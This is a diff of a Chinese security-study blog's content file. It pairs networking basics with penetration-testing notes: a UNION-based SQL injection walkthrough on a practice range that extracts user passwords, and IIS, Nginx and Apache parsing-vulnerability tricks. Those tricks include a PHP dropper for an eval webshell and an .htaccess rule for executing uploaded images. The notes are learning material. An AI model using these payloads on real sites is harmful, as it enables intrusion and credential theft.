-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如：</span><br><span class="line"></span><br><span class="line">10.1.1.1   255.0.0.0</span><br><span class="line">则10.1.1.1属于10.0.0.0这个网段，主机名字叫1.1.1</span><br><span class="line"></span><br><span class="line">10.1.1.1   255.255.0.0</span><br><span class="line">则10.1.1.1属于10.1.0.0这个网段，主机名字叫1.1</span><br><span class="line"></span><br><span class="line">10.1.1.1   255.255.255.0</span><br><span class="line">则10.1.1.1属于10.1.1.0这个网段，主机名字叫1</span><br></pre></td></tr></table></figure>
-<h1 id="0x03-IP地址详解"><a href="#0x03-IP地址详解" class="headerlink" title="0x03 IP地址详解"></a>0x03 IP地址详解</h1><p>IP地址分为五大类（以IP地址的第一位进行区分）</p>
-<ul>
-<li><strong>A类</strong>：    <strong>1-126</strong>  默认子网掩码：255.0.0.0</li>
-<li><p><strong>B类</strong>：<strong>128-191</strong>  默认子网掩码：255.255.0.0</p>
-</li>
-<li><p><strong>C类</strong>：<strong>192-223</strong>  默认子网掩码：255.255.255.0</p>
-</li>
-<li><p><strong>D类</strong>：<strong>224-239</strong>  组播地址</p>
-</li>
-<li><p><strong>E类</strong>：<strong>240-254</strong>   科研使用</p>
-</li>
-</ul>
-<p>注：</p>
-<p>1、目前我们可以使用的只有A、B、C 三类</p>
-<p>2、A、B、C 三类的子网掩码可以修改</p>
-<h2 id="3-1-127开头"><a href="#3-1-127开头" class="headerlink" title="3.1 127开头"></a>3.1 127开头</h2><p>这个开头只有一个地址：<strong>127.0.0.1：</strong>本地回环地址（永远代表自己）</p>
-<p>Ping这个地址代表跟自己通信（Ping它等于Ping自己）</p>
-<h2 id="3-2-广播地址"><a href="#3-2-广播地址" class="headerlink" title="3.2 广播地址"></a>3.2 广播地址</h2><p>主机位上全为255即为广播地址</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如：</span><br><span class="line">10.1.1.1  255.255.0.0</span><br><span class="line">这个IP属于10.1.0.0这个网段，那么把主机位、或者说0这个位置全都换成255就是广播地址:10.1.255.255就是这个IP的广播地址</span><br></pre></td></tr></table></figure>
-<h1 id="0x04-网关"><a href="#0x04-网关" class="headerlink" title="0x04 网关"></a>0x04 网关</h1><p><strong>网关（Gateway）</strong>：网络的出口，可以使不在同一个网段的IP通信，一般在路由器上</p>
-<p>通俗来讲就是访问互联网的通道</p>
-<p>路由器：可用连接内外网的设备</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">主机与主机之间互相通信:</span><br><span class="line">	首先判断目标IP地址与自己是否处在同一网段</span><br><span class="line">	若在同一网段，则直接发出去，而不找网关</span><br><span class="line">	若不在同一网段，则直接发包给网关</span><br></pre></td></tr></table></figure>
-<h1 id="0x05-DNS"><a href="#0x05-DNS" class="headerlink" title="0x05 DNS"></a>0x05 DNS</h1><p>DNS：Domain Name Service 域名服务</p>
-<p>用于<strong>解析网站域名</strong></p>
-<p>通过浏览器使用域名访问互联网：</p>
-<ul>
-<li>浏览器会先找是否有本地缓存（也就是之前是否访问过该网站）</li>
-<li><p>接着会找位于 C 盘的本地解析文件（host文件）</p>
-</li>
-<li><p>本地没有的话，浏览器会向DNS服务器发起解析请求</p>
-</li>
-</ul>
-<p>若直接访问 IP 地址的话则不需要DNS服务</p>
-<p>通过命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup www.baidu.com</span><br></pre></td></tr></table></figure>
-<p>可以查询该网址的 IP 地址以及帮你进行解析的 DNS </p>
-<p><img src="/2022/01/09/study/1.png" alt></p>
-<h1 id="0x06-网络测试命令"><a href="#0x06-网络测试命令" class="headerlink" title="0x06 网络测试命令"></a>0x06 网络测试命令</h1><ul>
-<li><p>如何查看IP地址</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipconfig # 查看IP地址基本信息</span><br><span class="line">ipconfig /all # 查看IP地址详细信息</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>测试网络连通性</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping 目标IP地址 # 测试网络连通性，有回复即为可以成功通信</span><br><span class="line">ping -t 目标IP地址 # 一直ping</span><br><span class="line">ping -n 目标IP地址 # 修改ping包的数量</span><br><span class="line"></span><br><span class="line">注:若ping不通，可能对方不在线，或者对方开着防火墙</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> learn </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>IP地址详解</title>
+      <link href="/2022/01/09/study/"/>
+      <url>/2022/01/09/study/</url>
+      
+        <content type="html"><![CDATA[<h1 id="0x01-IP（IPv4）"><a href="#0x01-IP（IPv4）" class="headerlink" title="0x01 IP（IPv4）"></a>0x01 IP（IPv4）</h1><p>IP地址是唯一的标识，分为a、b、c、d四个字段，形式为X.X.X.X，每个字段都由32位的二进制数字构成，所以每个字段范围都是0-255（但我们可以使用的IP不包括0和255）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如：10.2.1.1 、 192.168.1.1</span><br></pre></td></tr></table></figure><h1 id="0x02-子网掩码"><a href="#0x02-子网掩码" class="headerlink" title="0x02 子网掩码"></a>0x02 子网掩码</h1><ol><li><strong>局域网通信规则</strong>：在同一局域网中，所有的IP必须在同一网段中才可以互相通信</li><li><strong>IP地址构成</strong>：网络位+主机位（网络位相同的IP地址，属于同一网段）</li><li><strong>子网掩码</strong>：每一个IP地址必须配一个子网掩码，用来确定IP地址的网络位</li></ol><p><strong>子网掩码如何确定网络位</strong>：与<strong>255</strong>对应的数字为<strong>网络位</strong>，与<strong>0</strong>对应的数字为<strong>主机位</strong></p><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">255.0.0.0  、 255.255.0.0  、 255.255.255.0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">如：</span><br><span class="line"></span><br><span class="line">10.1.1.1   255.0.0.0</span><br><span class="line">则10.1.1.1属于10.0.0.0这个网段，主机名字叫1.1.1</span><br><span class="line"></span><br><span class="line">10.1.1.1   255.255.0.0</span><br><span class="line">则10.1.1.1属于10.1.0.0这个网段，主机名字叫1.1</span><br><span class="line"></span><br><span class="line">10.1.1.1   255.255.255.0</span><br><span class="line">则10.1.1.1属于10.1.1.0这个网段，主机名字叫1</span><br></pre></td></tr></table></figure><h1 id="0x03-IP地址详解"><a href="#0x03-IP地址详解" class="headerlink" title="0x03 IP地址详解"></a>0x03 IP地址详解</h1><p>IP地址分为五大类（以IP地址的第一位进行区分）</p><ul><li><strong>A类</strong>：    <strong>1-126</strong>  默认子网掩码：255.0.0.0</li><li><p><strong>B类</strong>：<strong>128-191</strong>  默认子网掩码：255.255.0.0</p></li><li><p><strong>C类</strong>：<strong>192-223</strong>  默认子网掩码：255.255.255.0</p></li><li><p><strong>D类</strong>：<strong>224-239</strong>  组播地址</p></li><li><p><strong>E类</strong>：<strong>240-254</strong>   科研使用</p></li></ul><p>注：</p><p>1、目前我们可以使用的只有A、B、C 三类</p><p>2、A、B、C 三类的子网掩码可以修改</p><h2 id="3-1-127开头"><a href="#3-1-127开头" class="headerlink" title="3.1 127开头"></a>3.1 127开头</h2><p>这个开头只有一个地址：<strong>127.0.0.1：</strong>本地回环地址（永远代表自己）</p><p>Ping这个地址代表跟自己通信（Ping它等于Ping自己）</p><h2 id="3-2-广播地址"><a href="#3-2-广播地址" class="headerlink" title="3.2 广播地址"></a>3.2 广播地址</h2><p>主机位上全为255即为广播地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如：</span><br><span class="line">10.1.1.1  255.255.0.0</span><br><span class="line">这个IP属于10.1.0.0这个网段，那么把主机位、或者说0这个位置全都换成255就是广播地址:10.1.255.255就是这个IP的广播地址</span><br></pre></td></tr></table></figure><h1 id="0x04-网关"><a href="#0x04-网关" class="headerlink" title="0x04 网关"></a>0x04 网关</h1><p><strong>网关（Gateway）</strong>：网络的出口，可以使不在同一个网段的IP通信，一般在路由器上</p><p>通俗来讲就是访问互联网的通道</p><p>路由器：可用连接内外网的设备</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">主机与主机之间互相通信:</span><br><span class="line">首先判断目标IP地址与自己是否处在同一网段</span><br><span class="line">若在同一网段，则直接发出去，而不找网关</span><br><span class="line">若不在同一网段，则直接发包给网关</span><br></pre></td></tr></table></figure><h1 id="0x05-DNS"><a href="#0x05-DNS" class="headerlink" title="0x05 DNS"></a>0x05 DNS</h1><p>DNS：Domain Name Service 域名服务</p><p>用于<strong>解析网站域名</strong></p><p>通过浏览器使用域名访问互联网：</p><ul><li>浏览器会先找是否有本地缓存（也就是之前是否访问过该网站）</li><li><p>接着会找位于 C 盘的本地解析文件（host文件）</p></li><li><p>本地没有的话，浏览器会向DNS服务器发起解析请求</p></li></ul><p>若直接访问 IP 地址的话则不需要DNS服务</p><p>通过命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup www.baidu.com</span><br></pre></td></tr></table></figure><p>可以查询该网址的 IP 地址以及帮你进行解析的 DNS </p><p><img src="/2022/01/09/study/1.png" alt></p><h1 id="0x06-网络测试命令"><a href="#0x06-网络测试命令" class="headerlink" title="0x06 网络测试命令"></a>0x06 网络测试命令</h1><ul><li><p>如何查看IP地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ipconfig # 查看IP地址基本信息</span><br><span class="line">ipconfig /all # 查看IP地址详细信息</span><br></pre></td></tr></table></figure></li><li><p>测试网络连通性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ping 目标IP地址 # 测试网络连通性，有回复即为可以成功通信</span><br><span class="line">ping -t 目标IP地址 # 一直ping</span><br><span class="line">ping -n 目标IP地址 # 修改ping包的数量</span><br><span class="line"></span><br><span class="line">注:若ping不通，可能对方不在线，或者对方开着防火墙</span><br></pre></td></tr></table></figure></li></ul>]]></content>
+      
+      
       <categories>
-        <category>基础知识和笔记</category>
+          
+          <category> 基础知识和笔记 </category>
+          
       </categories>
-      <tags>
-        <tag>learn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>MySQL简单手工注入</title>
-    <url>/2022/01/08/%E6%90%9E%E6%B8%97%E9%80%8F-1/</url>
-    <content><![CDATA[<p>题目是墨者里的一道入门题</p>
-<p><img src="/2022/01/08/%E6%90%9E%E6%B8%97%E9%80%8F-1/1.png" alt></p>
-<p>访问靶场，找到有注入点的地方</p>
-<p><img src="/2022/01/08/%E6%90%9E%E6%B8%97%E9%80%8F-1/2.png" alt></p>
-<h2 id="一、测试是否有注入漏洞"><a href="#一、测试是否有注入漏洞" class="headerlink" title="一、测试是否有注入漏洞"></a>一、测试是否有注入漏洞</h2><p>在需要传递参数的地方进行测试</p>
-<p><img src="/2022/01/08/%E6%90%9E%E6%B8%97%E9%80%8F-1/3.png" alt></p>
-<p>发现页面显示有错，则存在注入漏洞：</p>
-<ol>
-<li>猜解列名数量(字段数)，使用<strong>order by</strong>来进行猜解</li>
-<li>报错猜解准备 例如：<strong>?id=-1 union select 1,2,3,4</strong></li>
-</ol>
-<span id="more"></span>
-<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><ol>
-<li>版本：<strong>version()</strong></li>
-<li>数据库名字：<strong>database()</strong></li>
-<li>用户名：<strong>user()</strong></li>
-<li>操作系统：<strong>@@version_compile_os</strong></li>
-<li>…</li>
-</ol>
-<p>因此能找出以下信息:</p>
-<ol>
-<li>版本：<strong>5.7.22-0ubuntu0.16.04.1</strong></li>
-<li>数据库名字：<strong>mozhe_Discuz_StormGroup</strong></li>
-<li>用户名：<strong>root@localhost</strong></li>
-<li>操作系统：<strong>Linux</strong></li>
-</ol>
-<h2 id="三、数据注入"><a href="#三、数据注入" class="headerlink" title="三、数据注入"></a>三、数据注入</h2><ul>
-<li>在MySQL5.0以上的版本中，MySQL存在一个自带数据库名为<strong>information_schema</strong>，它是一个存储记录有所有数据库名，表名和列名的数据库，也相当于可以通过它获取指定数据库下面的表名或列名信息</li>
-<li>数据库中用符号”<strong>.</strong>“代表下一级</li>
-<li><strong>information_schema.tables</strong>：记录所有表名的表</li>
-<li><strong>information_schema.columns</strong>：记录所有列名的表</li>
-</ul>
-<p>一、通过sql语句将数据库下的所有表名显示出来：</p>
-<p><strong>?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=’mozhe_Discuz_StormGroup’</strong></p>
-<p>如图：</p>
-<p><img src="/2022/01/08/%E6%90%9E%E6%B8%97%E9%80%8F-1/4.png" alt></p>
-<p>二、再通过这个表名将下面的所有列名显示出来：<br><strong>?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=’StormGroup_member’</strong><br>如图：</p>
-<p><img src="/2022/01/08/%E6%90%9E%E6%B8%97%E9%80%8F-1/5.png" alt></p>
-<p>三、只需要将<strong>name</strong>和<strong>password</strong>显示出来：<br><strong>?id=-1 union select 1,name,password,4 from StormGroup_member limit x,1</strong><br>因为可能存在多解情况，因此要逐个试一遍，让x=0，1，2…</p>
-<p>最后的结果是：<br><strong>?id=-1 union select 1,name,password,4 from StormGroup_member limit 1,1</strong></p>
-<p><img src="/2022/01/08/%E6%90%9E%E6%B8%97%E9%80%8F-1/6.png" alt></p>
-<p>将密码用md5解密，登录成功后即可获得key</p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> learn </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>解析漏洞</title>
+      <link href="/2022/01/09/%E6%90%9E%E6%B8%97%E9%80%8F-2/"/>
+      <url>/2022/01/09/%E6%90%9E%E6%B8%97%E9%80%8F-2/</url>
+      
+        <content type="html"><![CDATA[<h1 id="0x01-IIS5-x-6-0解析漏洞"><a href="#0x01-IIS5-x-6-0解析漏洞" class="headerlink" title="0x01 IIS5.x/6.0解析漏洞"></a>0x01 IIS5.x/6.0解析漏洞</h1><p>IIS6.0解析利用的方法有两种：</p><ol><li><p><strong>目录解析</strong></p><p>在网站下建立文件夹名字为.<strong>asp</strong>、.<strong>asa</strong>的文件夹，其目录内的任何扩展名的文件都别IIS当作asp文件来解析并执行。例如创建目录<strong>pamela.asp</strong>，那么<strong>pamela.asp / 1.jpg</strong>将被当作asp文件来执行。</p></li><li><p><strong>文件解析</strong></p><p>在IIS6.0下，分号后面的不被解析，也就是说pamela.asp;.jpg会被服务器看成是pamela.asp，还有        IIS6.0默认的可执行文件除了asp还包括这三种:</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pamela.asa</span><br><span class="line">pamela.cer</span><br><span class="line">pamela.cdx</span><br></pre></td></tr></table></figure><span id="more"></span><h1 id="0x02-IIS7-0-IIS7-5-Nginx-lt-8-03畸形解析漏洞"><a href="#0x02-IIS7-0-IIS7-5-Nginx-lt-8-03畸形解析漏洞" class="headerlink" title="0x02 IIS7.0/IIS7.5/Nginx&lt;8.03畸形解析漏洞"></a>0x02 IIS7.0/IIS7.5/Nginx&lt;8.03畸形解析漏洞</h1><p>在默认Fast-CGI开启状况下，上传一个名字为<strong>pamela.jpg</strong>，内容为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span></span><br><span class="line">fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval(&amp;_POST[cmd])?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>的文件，然后访问<strong>pamela.jpg/.php</strong>，在这个目录下就会生成一句话木马<strong>shell.php</strong></p><h1 id="0x03-Nginx-lt-8-03空字节代码执行漏洞"><a href="#0x03-Nginx-lt-8-03空字节代码执行漏洞" class="headerlink" title="0x03 Nginx&lt;8.03空字节代码执行漏洞"></a>0x03 Nginx&lt;8.03空字节代码执行漏洞</h1><ol><li><p><strong>影响版本</strong>:</p><p>0.5./0.6./0.7&lt;=0.7.65/0.8&lt;=0.8.37</p></li><li><p><strong>简介</strong></p><p>Nginx在图片中嵌入php代码然后通过访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx.jpg%00.php</span><br></pre></td></tr></table></figure><p>来执行其中的代码</p></li></ol><h1 id="0x04-Apache解析漏洞"><a href="#0x04-Apache解析漏洞" class="headerlink" title="0x04 Apache解析漏洞"></a>0x04 Apache解析漏洞</h1><ol><li><p><strong>背景</strong></p><p>Apache是从右到左开始判断解析，如果为不可识别解析，就再往左判断。</p></li><li><p><strong>简介</strong></p><p>比如<strong>pamela.php.owf.rar</strong> “<strong>.owf</strong>”和”<strong>.rar</strong>” 这两种后缀是 apache 不可识别解析,apache就会把<strong>pamela.php.owf.rar</strong>解析成 <strong>.php</strong></p></li><li><p><strong>利用</strong></p><p>如何判断是不是合法的后缀就是这个漏洞的利用关键,<strong>pamela.php.rara.jpg.png…</strong>（把你知道的常见后缀都写上）去测试是否是合法后缀</p></li></ol><h1 id="0x05-其他"><a href="#0x05-其他" class="headerlink" title="0x05 其他"></a>0x05 其他</h1><ol><li><p>在Windows环境下，<strong>xx.jpg[空格]或xx.jpg</strong> 这两类文件是不允许存在的，若这样命名，Windows会默认去除空格和点，我们可以通过抓包，在文件名后加一个<strong>空格或者点</strong>来绕过黑名单，若上传成功，空格和点都会被Windows自动消除，这样也可以getshell</p></li><li><p>如果在apache中 <strong>.htaccess</strong>可被执行，且可被上传，那可以尝试在 .htaccess中写入：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">cimer</span>&quot;&gt;</span> </span><br><span class="line">SetHandler application/x-httpd-php </span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后再上传shell.jpg的木马，这样shell.jpg就可解析为php文件</p></li></ol>]]></content>
+      
+      
       <categories>
-        <category>搞渗透</category>
+          
+          <category> 搞渗透 </category>
+          
       </categories>
-      <tags>
-        <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>解析漏洞</title>
-    <url>/2022/01/09/%E6%90%9E%E6%B8%97%E9%80%8F-2/</url>
-    <content><![CDATA[<h1 id="0x01-IIS5-x-6-0解析漏洞"><a href="#0x01-IIS5-x-6-0解析漏洞" class="headerlink" title="0x01 IIS5.x/6.0解析漏洞"></a>0x01 IIS5.x/6.0解析漏洞</h1><p>IIS6.0解析利用的方法有两种：</p>
-<ol>
-<li><p><strong>目录解析</strong></p>
-<p>在网站下建立文件夹名字为.<strong>asp</strong>、.<strong>asa</strong>的文件夹，其目录内的任何扩展名的文件都别IIS当作asp文件来解析并执行。例如创建目录<strong>pamela.asp</strong>，那么<strong>pamela.asp / 1.jpg</strong>将被当作asp文件来执行。</p>
-</li>
-<li><p><strong>文件解析</strong></p>
-<p>在IIS6.0下，分号后面的不被解析，也就是说pamela.asp;.jpg会被服务器看成是pamela.asp，还有        IIS6.0默认的可执行文件除了asp还包括这三种:</p>
-</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pamela.asa</span><br><span class="line">pamela.cer</span><br><span class="line">pamela.cdx</span><br></pre></td></tr></table></figure>
-<span id="more"></span>
-<h1 id="0x02-IIS7-0-IIS7-5-Nginx-lt-8-03畸形解析漏洞"><a href="#0x02-IIS7-0-IIS7-5-Nginx-lt-8-03畸形解析漏洞" class="headerlink" title="0x02 IIS7.0/IIS7.5/Nginx&lt;8.03畸形解析漏洞"></a>0x02 IIS7.0/IIS7.5/Nginx&lt;8.03畸形解析漏洞</h1><p>在默认Fast-CGI开启状况下，上传一个名字为<strong>pamela.jpg</strong>，内容为</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span></span><br><span class="line">fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval(&amp;_POST[cmd])?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>的文件，然后访问<strong>pamela.jpg/.php</strong>，在这个目录下就会生成一句话木马<strong>shell.php</strong></p>
-<h1 id="0x03-Nginx-lt-8-03空字节代码执行漏洞"><a href="#0x03-Nginx-lt-8-03空字节代码执行漏洞" class="headerlink" title="0x03 Nginx&lt;8.03空字节代码执行漏洞"></a>0x03 Nginx&lt;8.03空字节代码执行漏洞</h1><ol>
-<li><p><strong>影响版本</strong>:</p>
-<p>0.5./0.6./0.7&lt;=0.7.65/0.8&lt;=0.8.37</p>
-</li>
-<li><p><strong>简介</strong></p>
-<p>Nginx在图片中嵌入php代码然后通过访问</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxx.jpg%00.php</span><br></pre></td></tr></table></figure>
-<p>来执行其中的代码</p>
-</li>
-</ol>
-<h1 id="0x04-Apache解析漏洞"><a href="#0x04-Apache解析漏洞" class="headerlink" title="0x04 Apache解析漏洞"></a>0x04 Apache解析漏洞</h1><ol>
-<li><p><strong>背景</strong></p>
-<p>Apache是从右到左开始判断解析，如果为不可识别解析，就再往左判断。</p>
-</li>
-<li><p><strong>简介</strong></p>
-<p>比如<strong>pamela.php.owf.rar</strong> “<strong>.owf</strong>”和”<strong>.rar</strong>” 这两种后缀是 apache 不可识别解析,apache就会把<strong>pamela.php.owf.rar</strong>解析成 <strong>.php</strong></p>
-</li>
-<li><p><strong>利用</strong></p>
-<p>如何判断是不是合法的后缀就是这个漏洞的利用关键,<strong>pamela.php.rara.jpg.png…</strong>（把你知道的常见后缀都写上）去测试是否是合法后缀</p>
-</li>
-</ol>
-<h1 id="0x05-其他"><a href="#0x05-其他" class="headerlink" title="0x05 其他"></a>0x05 其他</h1><ol>
-<li><p>在Windows环境下，<strong>xx.jpg[空格]或xx.jpg</strong> 这两类文件是不允许存在的，若这样命名，Windows会默认去除空格和点，我们可以通过抓包，在文件名后加一个<strong>空格或者点</strong>来绕过黑名单，若上传成功，空格和点都会被Windows自动消除，这样也可以getshell</p>
-</li>
-<li><p>如果在apache中 <strong>.htaccess</strong>可被执行，且可被上传，那可以尝试在 .htaccess中写入：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">cimer</span>&quot;&gt;</span> </span><br><span class="line">SetHandler application/x-httpd-php </span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>然后再上传shell.jpg的木马，这样shell.jpg就可解析为php文件</p>
-</li>
-</ol>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 文件上传 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>.htaccess文件上传漏洞</title>
+      <link href="/2022/01/09/%E6%90%9E%E6%B8%97%E9%80%8F-3/"/>
+      <url>/2022/01/09/%E6%90%9E%E6%B8%97%E9%80%8F-3/</url>
+      
+        <content type="html"><![CDATA[<p><strong>.htaccess</strong>文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404页面、改文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><p>需要用到的代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">cimer</span>&quot;&gt;</span></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure><p>通过.htaccess文件，调用php的解析器解析一个文件名只要包含”cimer”这个字符串的任意文件。这个”cimer”的内容如果是一句话木马，即可利用中国菜刀进行连接。</p><span id="more"></span><h3 id="实战意义："><a href="#实战意义：" class="headerlink" title="实战意义："></a>实战意义：</h3><ol><li>如果存在可以上传.htaccess文件，就可以直接利用规则解析</li><li>如果存在修改.htaccess文件权限，修改解析规则</li></ol><h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><p>.htaccess文件不能起名字，他就是.htaccess文件，如果你将他改为4.htaccess或者其他的什么名字是不可以的，无法解析。在实战中有可能上传上去这个文件会被自动重命名，被重命名了就不可以了。</p>]]></content>
+      
+      
       <categories>
-        <category>搞渗透</category>
+          
+          <category> 搞渗透 </category>
+          
       </categories>
-      <tags>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>.htaccess文件上传漏洞</title>
-    <url>/2022/01/09/%E6%90%9E%E6%B8%97%E9%80%8F-3/</url>
-    <content><![CDATA[<p><strong>.htaccess</strong>文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404页面、改文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
-<p>需要用到的代码如下：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">cimer</span>&quot;&gt;</span></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>通过.htaccess文件，调用php的解析器解析一个文件名只要包含”cimer”这个字符串的任意文件。这个”cimer”的内容如果是一句话木马，即可利用中国菜刀进行连接。</p>
-<span id="more"></span>
-<h3 id="实战意义："><a href="#实战意义：" class="headerlink" title="实战意义："></a>实战意义：</h3><ol>
-<li>如果存在可以上传.htaccess文件，就可以直接利用规则解析</li>
-<li>如果存在修改.htaccess文件权限，修改解析规则</li>
-</ol>
-<h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><p>.htaccess文件不能起名字，他就是.htaccess文件，如果你将他改为4.htaccess或者其他的什么名字是不可以的，无法解析。在实战中有可能上传上去这个文件会被自动重命名，被重命名了就不可以了。</p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 文件上传 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>MySQL简单手工注入</title>
+      <link href="/2022/01/08/%E6%90%9E%E6%B8%97%E9%80%8F-1/"/>
+      <url>/2022/01/08/%E6%90%9E%E6%B8%97%E9%80%8F-1/</url>
+      
+        <content type="html"><![CDATA[<p>题目是墨者里的一道入门题</p><p><img src="/2022/01/08/%E6%90%9E%E6%B8%97%E9%80%8F-1/1.png" alt></p><p>访问靶场，找到有注入点的地方</p><p><img src="/2022/01/08/%E6%90%9E%E6%B8%97%E9%80%8F-1/2.png" alt></p><h2 id="一、测试是否有注入漏洞"><a href="#一、测试是否有注入漏洞" class="headerlink" title="一、测试是否有注入漏洞"></a>一、测试是否有注入漏洞</h2><p>在需要传递参数的地方进行测试</p><p><img src="/2022/01/08/%E6%90%9E%E6%B8%97%E9%80%8F-1/3.png" alt></p><p>发现页面显示有错，则存在注入漏洞：</p><ol><li>猜解列名数量(字段数)，使用<strong>order by</strong>来进行猜解</li><li>报错猜解准备 例如：<strong>?id=-1 union select 1,2,3,4</strong></li></ol><span id="more"></span><h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><ol><li>版本：<strong>version()</strong></li><li>数据库名字：<strong>database()</strong></li><li>用户名：<strong>user()</strong></li><li>操作系统：<strong>@@version_compile_os</strong></li><li>…</li></ol><p>因此能找出以下信息:</p><ol><li>版本：<strong>5.7.22-0ubuntu0.16.04.1</strong></li><li>数据库名字：<strong>mozhe_Discuz_StormGroup</strong></li><li>用户名：<strong>root@localhost</strong></li><li>操作系统：<strong>Linux</strong></li></ol><h2 id="三、数据注入"><a href="#三、数据注入" class="headerlink" 